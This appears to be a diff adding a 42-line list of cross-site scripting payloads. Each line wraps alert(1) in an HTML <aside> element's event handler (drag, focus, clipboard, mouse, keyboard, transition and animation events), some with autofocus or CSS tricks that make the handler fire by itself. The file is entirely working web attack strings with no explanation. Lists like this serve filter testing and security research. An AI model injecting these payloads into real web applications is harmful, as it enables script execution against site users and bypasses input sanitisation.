@@ -1,0 +1,42 @@
+<aside draggable="true" ondrag="alert(1)">test</aside>
+<aside draggable="true" ondragend="alert(1)">test</aside>
+<aside draggable="true" ondragenter="alert(1)">test</aside>
+<aside draggable="true" ondragleave="alert(1)">test</aside>
+<aside draggable="true" ondragstart="alert(1)">test</aside>
+<aside id=x tabindex=1 onactivate=alert(1)></aside>
+<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>
+<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>
+<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>
+<aside id=x tabindex=1 onfocus=alert(1)></aside>
+<aside id=x tabindex=1 onfocusin=alert(1)></aside>
+<aside onbeforecopy="alert(1)" contenteditable>test</aside>
+<aside onbeforecut="alert(1)" contenteditable>test</aside>
+<aside onbeforepaste="alert(1)" contenteditable>test</aside>
+<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside onclick="alert(1)">test</aside>
+<aside oncontextmenu="alert(1)">test</aside>
+<aside oncopy="alert(1)" contenteditable>test</aside>
+<aside oncut="alert(1)" contenteditable>test</aside>
+<aside ondblclick="alert(1)">test</aside>
+<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside onkeydown="alert(1)" contenteditable>test</aside>
+<aside onkeypress="alert(1)" contenteditable>test</aside>
+<aside onkeyup="alert(1)" contenteditable>test</aside>
+<aside onmousedown="alert(1)">test</aside>
+<aside onmouseenter="alert(1)">test</aside>
+<aside onmouseleave="alert(1)">test</aside>
+<aside onmousemove="alert(1)">test</aside>
+<aside onmouseout="alert(1)">test</aside>
+<aside onmouseover="alert(1)">test</aside>
+<aside onmouseup="alert(1)">test</aside>
+<aside onpaste="alert(1)" contenteditable>test</aside>
+<div draggable="true" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>
+<div draggable="true" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable>drop here</aside>
+<style>:target {color: red;}</style><aside id=x style="transition:color 10s" ontransitioncancel=alert(1)></aside>
+<style>:target {color:red;}</style><aside id=x style="transition:color 1s" ontransitionend=alert(1)></aside>
+<style>:target {transform: rotate(180deg);}</style><aside id=x style="transition:transform 2s" ontransitionrun=alert(1)></aside>
+<style>@keyframes slidein {}</style><aside style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></aside>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style="position:absolute;" onanimationcancel="alert(1)"></aside>
+<style>@keyframes x{}</style><aside style="animation-name:x" onanimationend="alert(1)"></aside>
+<style>@keyframes x{}</style><aside style="animation-name:x" onanimationstart="alert(1)"></aside>
+<svg><aside onload=alert(1)></aside>
